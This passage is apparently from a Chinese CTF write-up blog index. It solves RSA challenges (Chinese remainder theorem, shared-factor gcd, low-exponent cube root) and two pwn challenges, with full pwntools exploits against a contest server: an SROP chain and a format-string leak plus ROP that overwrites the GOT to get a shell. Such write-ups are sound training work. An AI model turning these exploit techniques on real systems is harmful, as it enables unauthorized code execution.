class="number">8992204063713908492214256291861339175525948946919629972908439132005643626148678347198381531633907182877152728077958345519083406637446972079387161726967295886447791613166577391233866583354793842121902234644830640050181130381996083089350911224037154798259291124104894554037604500881250119806371348673833105103600782286898276354573884788251542211434143476774391457587885772379990104835187104619922442613860682792470389490804228050671124495925536024571104944112397143299499508504917890140939438891891453283594000764399193028606955089853654071198909973555844004685149713774167524224100487937899126480545681565581673958854</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">e = <span class="number">89</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">m_e = chinese_remainder_theorem(moduli_list, remainders_list)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">message = gmpy2.iroot(m_e, e)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>n1与n2有共同因子P，直接求最大公约数</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921546-2140970977.jpg" alt="img"></p>
+<ul>
+<li></li>
+<li></li>
+</ul>
+<p>print(gmpy2.gcd(E1, phi_1))# 35</p>
+<p>同余性质，把m次幂的降最低</p>
+<p>我们知道:如果a≡b(mod mn)，可以将其拆解为两个同余式:a ≡b(mod m)和a≡b(mod n)。基于此，存在以下推论:c1≡ m°(mod P)和 c ≡ me(mod Q1)，以及 c ≡ m°(mod P)和 c ≡ m“”(mod Q2)。通过相乘性质，我们可以得到 c &#x3D; c·c ≡ me·me(mod P).</p>
+<p>然后，我们可以利用中国剩余定理，将这组同余方程结合起来得到唯一解:c&#x3D;me(mod Q)，c2三m,e2(mod Qz)，cs&#x3D;me·me(mod P)。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_crt</span>(<span class="params">moduli, remainders</span>):</span><br><span class="line"></span><br><span class="line">  total = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  N = reduce(<span class="keyword">lambda</span> a, b: a * b, moduli) </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> modulus, remainder <span class="keyword">in</span> <span class="built_in">zip</span>(moduli, remainders):</span><br><span class="line"></span><br><span class="line">​    Ni = N // modulus </span><br><span class="line"></span><br><span class="line">​    total += remainder * gmpy2.invert(Ni, modulus) * Ni </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> total % N </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">n1 = <span class="number">21655617838358037895534605162358784326495251462447218485102155997156394132443891540203860915433559917314267455046844360743623050975083617915806922096697304603878134295964650430393375225792781804726292460923708890722827436552209016368047420993613497196059326374616217655625810171080545267058266278112647715784756433895809757917070401895613168910166812566545593405362953487807840539425383123369842741821260523005208479361484891762714749721683834754601596796707669718084343845276793153649005628590896279281956588607062999398889314240295073524688108299345609307659091936270255367762936542565961639163236594456862919813549</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">24623016338698579967431781680200075706241014384066250660360949684385831604822817314457973559632215801205780786144608311361063622813017396858888436529116737754653067203843306015767091585697803364656624926853551997229897087731298797904208292585562517602132663331748784390752958757661484560335406769204491939879324079089140420467301773366050084810282369044622442784113688062220370531522036512803461607049619641336524486507388232280683726065679295742456158606213294533956580462863488082028563360006966912264908424680686577344549034033470952036766850596897062924137344079889301948258438680545785139118107899367307031396309</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">2615722342860373905833491925692465899705229373785773622118746270300793647098821993550686581418882518204094299812033719020077509270290007615866572202192731169538843513634106977827187688709725198643481375562114294032637211892276591506759075653224150064709644522873824736707734614347484224826380423111005274801291329132431269949575630918992520949095837680436317128676927389692790957195674310219740918585437793016218702207192925330821165126647260859644876583452851011163136097317885847756944279214149072452930036614703451352331567857453770020626414948005358547089607480508274005888648569717750523094342973767148059329557</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">6769301750070285366235237940904276375318319174100507184855293529277737253672792851212185236735819718282816927603167670154115730023644681563602020732801002035524276894497009910595468459369997765552682404281557968383413458466181053253824257764740656801662020120125474240770889092605770532420770257017137747744565202144183642972714927894809373657977142884508230107940618969817885214454558667008383628769508472963039551067432579488899853537410634175220583489733111861415444811663313479382343954977022383996370428051605169520337142916079300674356082855978456798812661535740008277913769809112114364617214398154457094899399</span></span><br><span class="line"></span><br><span class="line">E1 = <span class="number">377312346502536339265</span></span><br><span class="line"></span><br><span class="line">E2 = <span class="number">561236991551738188085</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">P = gmpy2.gcd(n1, n2)</span><br><span class="line"></span><br><span class="line">Q1 = n1 // P</span><br><span class="line"></span><br><span class="line">Q2 = n2 // P</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">exp1 = gmpy2.invert(E1 // <span class="number">35</span>, (P - <span class="number">1</span>) * (Q1 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">exp2 = gmpy2.invert(E2 // <span class="number">35</span>, (P - <span class="number">1</span>) * (Q2 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">dec_c1 = <span class="built_in">pow</span>(c1, exp1, n1)</span><br><span class="line"></span><br><span class="line">dec_c2 = <span class="built_in">pow</span>(c2, exp2, n2)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">c3 = dec_c1 * dec_c2 % P</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">mod_c1 = dec_c1 % Q1</span><br><span class="line"></span><br><span class="line">mod_c2 = dec_c2 % Q2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">combined_result = solve_crt([mod_c1, mod_c2, c3], [Q1, Q2, P])</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">phi = (Q1 - <span class="number">1</span>) * (Q2 - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n = Q1 * Q2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">c_m = combined_result % n</span><br><span class="line"></span><br><span class="line">e = <span class="number">35</span> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">7</span>, phi)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c_m, d, n)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(m, <span class="number">5</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>解题收获：</p>
+<p>提升简单逻辑推理能力，掌握中国剩余定理方法</p>
+<h3 id="just-math"><a href="#just-math" class="headerlink" title="just math"></a>just math</h3><p>低加密指数e&#x3D;3，rsa的加密公式c &#x3D; m的e次方 mod n，c &lt; n^(1&#x2F;3), 通过直接计算密文的整数立方根来恢复原始消息 m</p>
+<p>Exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> <span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ciphertext = <span class="number">1924635889210773924711378522965854207843051472146513194916783167061162458090637355250481272581703873478440579298520036474045171065792195995974658228386969780210579430878151292611702887188041669069264460156268170885354178469389132838450834398493018168203742426193822379309445968101310981520048027589913953414945962743334769252188573436970839413914815373095974184931183788899690779478585666855429821591221553873937831095720715148525794252576976891489499479497861512</span></span><br><span class="line"> modulus = <span class="number">2260375559104345425590426977960386256287009777233277062625487017885931446911942921201492850167115455071935831283269948569220356763988762825230315520633702443866690239945242948370781975714325308306543337600783340792458991506685843729962897796956171467876531084194426101796617903015810156717396227079274786269217370618477266867389155551378798713259843750289765858717627925689021561352438080039804957145513478767641674644346609224034274906228784593435462413278410143</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">21</span>):</span><br><span class="line">   candidate = ciphertext + offset * modulus</span><br><span class="line">   root, exact = gmpy2.iroot(candidate, <span class="number">3</span>) </span><br><span class="line">   <span class="keyword">if</span> exact: </span><br><span class="line">     <span class="built_in">print</span>(long_to_bytes(root))  </span><br></pre></td></tr></table></figure>
+
+<p>解题收获：</p>
+<p>对密码学的rsa解密公式更加理解</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921450-1252213645.jpg" alt="img"></p>
+<p>这里输出完之后会直接接收一串字符串</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921458-1226483841.jpg" alt="img"></p>
+<p>然后跳转进来，可以看到能接收的字符串是远远多于它所分配的空间，可以利用栈溢出的漏洞</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921595-1495059577.jpg" alt="img"></p>
+<p>然后可以直接看到这里有&#x2F;bin&#x2F;sh的地址</p>
+<p>然后就是简单构造一个rop，然后利用栈溢出跳转到构造的rop上执行</p>
+<p>Exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">data</span>):</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">send_after</span>(<span class="params">prompt, data</span>):</span><br><span class="line">   p.sendafter(prompt, data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">send_line</span>(<span class="params">data</span>):</span><br><span class="line">   p.sendline(data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">send_line_after</span>(<span class="params">prompt, data</span>):</span><br><span class="line">   p.sendlineafter(prompt, data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">receive_data</span>():</span><br><span class="line">   <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">print_receive</span>():</span><br><span class="line">   <span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">receive_until</span>(<span class="params">delimiter</span>):</span><br><span class="line">   <span class="keyword">return</span> p.recvuntil(delimiter)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">interactive_mode</span>():</span><br><span class="line">   p.interactive()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">debug_mode</span>():</span><br><span class="line">   gdb.attach(p)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_leak_address</span>():</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> p = remote(<span class="string">&#x27;101.200.58.4&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> sig_frame = SigreturnFrame()</span><br><span class="line"> sig_frame.rax = <span class="number">59</span> </span><br><span class="line"> sig_frame.rdi = <span class="number">0x40200A</span> </span><br><span class="line"> sig_frame.rsi = <span class="number">0x0</span> </span><br><span class="line"> sig_frame.rdx = <span class="number">0x0</span> </span><br><span class="line"> sig_frame.rip = <span class="number">0x40102D</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> payload = (</span><br><span class="line">   p64(<span class="number">0x40103D</span>) + p64(<span class="number">0x401034</span>) + p64(<span class="number">0x401030</span>) + </span><br><span class="line">   p64(<span class="number">0x401034</span>) + p64(<span class="number">0x401030</span>) + p64(<span class="number">0x401034</span>) + </span><br><span class="line">   p64(<span class="number">0x401030</span>) + p64(<span class="number">0x401034</span>) + p64(<span class="number">0x40102D</span>) + </span><br><span class="line">   flat(sig_frame)</span><br><span class="line"> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> p.interactive() </span><br></pre></td></tr></table></figure>
+
+<p>解题收获：</p>
+<p>对简单栈溢出漏洞更熟练解出赛题</p>
+<h3 id="Ret"><a href="#Ret" class="headerlink" title="Ret"></a>Ret</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921462-2002942619.jpg" alt="img"></p>
+<p>checksec查看保护发现是amd64位系统，几乎什么保护都没有开，将程序拖入ida</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921454-1116763471.jpg" alt="img"></p>
+<p>发现在output函数中存在一个格式化字符串漏洞</p>
+<p><img src="file:///C:/Users/Lenovo/AppData/Local/Temp/msohtmlclip1/01/clip_image092.jpg" alt="img"></p>
+<p>在input函数中当随机数大于等于0x90时会刚好可以覆盖rbp和ret地址，并且read读取的长度取决于 seed，而seed是存储在栈上的，那么只要控制rbp的值并且把程序劫持到input函数中的read函数即可 实现一个非常长的栈溢出，而想要控制rbp的值则需要泄露栈的地址，前面的格式化字符串漏洞就刚好 可以泄露栈地址，后面就是利用栈溢出，使用puts函数泄露出libc基地址，然后将puts函数的got表改为system函数，但 是在使用puts函数泄露libc地址之后rdx会置0，后面使用read修改got表使需要让rdx不为0，所以在中 间执行一个srand函数使rdx有值，修改puts函数的got表并写入&#x2F;bin&#x2F;sh字符串即可执行 system(“&#x2F;bin&#x2F;sh”)拿到shell</p>
+<p>Exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> r = remote(<span class="string">&quot;101.200.58.4&quot;</span>, <span class="string">&quot;10004&quot;</span>)</span><br><span class="line"></span><br><span class="line"> libc_shared_lib = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> r.sendafter(<span class="string">&quot;ask?\n&quot;</span>, <span class="string">&quot;%p\x00&quot;</span>)</span><br><span class="line"> leak_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;ok,&quot;</span>)[:<span class="number">14</span>], <span class="number">16</span>)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Leaked address: &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"> stack_addr = leak_addr + <span class="number">0x7ffffa9424b8</span> - <span class="number">0x7ffffa9424ac</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> c_lib = ctypes.cdll.LoadLibrary(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"> c_lib.srand(c_lib.time(<span class="number">0</span>))</span><br><span class="line"> generated_seed = c_lib.rand() % <span class="number">160</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Generated seed: &quot;</span> + <span class="built_in">hex</span>(generated_seed))</span><br><span class="line"> <span class="keyword">if</span> generated_seed &lt; <span class="number">0x90</span>:</span><br><span class="line">   quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> padding = <span class="string">b&quot;a&quot;</span> * <span class="number">0x80</span> </span><br><span class="line"> first_payload = padding + p64(stack_addr) + p64(<span class="number">0x400873</span>)</span><br><span class="line"></span><br><span class="line"> <span class="built_in">print</span>(r.recvuntil(<span class="string">&quot;number\n&quot;</span>))</span><br><span class="line"> r.send(first_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> puts_got_addr = <span class="number">0x601018</span></span><br><span class="line"> puts_plt_addr = <span class="number">0x400600</span></span><br><span class="line"> pop_rdi_ret_addr = <span class="number">0x400923</span></span><br><span class="line"> ret_gadget_addr = pop_rdi_ret_addr + <span class="number">1</span></span><br><span class="line"> pop_rsi_ret_addr = <span class="number">0x400921</span></span><br><span class="line"> read_plt_addr = <span class="number">0x400620</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> second_payload = padding</span><br><span class="line"> second_payload += p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br><span class="line"> second_payload += p64(<span class="number">0x400630</span>) </span><br><span class="line"> second_payload += p64(pop_rdi_ret_addr) + p64(<span class="number">0</span>) + p64(pop_rsi_ret_addr) + p64(puts_got_addr) + p64(<span class="number">0</span>) + p64(read_plt_addr)</span><br><span class="line"> second_payload += p64(ret_gadget_addr) + p64(pop_rdi_ret_addr) + p64(puts_got_addr + <span class="number">8</span>) + p64(puts_plt_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> sleep(<span class="number">1</span>)</span><br><span class="line"> r.send(second_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc_shared_lib.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;libc base address: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> r.send(p64(libc_base + libc_shared_lib.symbols[<span class="string">&quot;system&quot;</span>]) + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>解题收获：</p>
+<p>对格式化字符串和栈溢出的利用漏洞更熟悉利用</p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+  </entry>
+</search>
